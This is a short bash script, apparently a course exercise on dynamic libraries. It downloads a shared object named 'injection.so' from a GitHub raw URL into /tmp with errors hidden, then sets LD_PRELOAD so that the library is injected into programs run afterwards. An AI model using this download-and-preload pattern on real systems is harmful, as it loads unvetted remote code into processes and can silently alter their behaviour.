#!/bin/bash
wget -P /tmp https://raw.githubusercontent.com/[your-username]/alx-low_level_programming/master/0x18-dynamic_libraries/injection.so 2>/dev/null
export LD_PRELOAD=/tmp/injection.so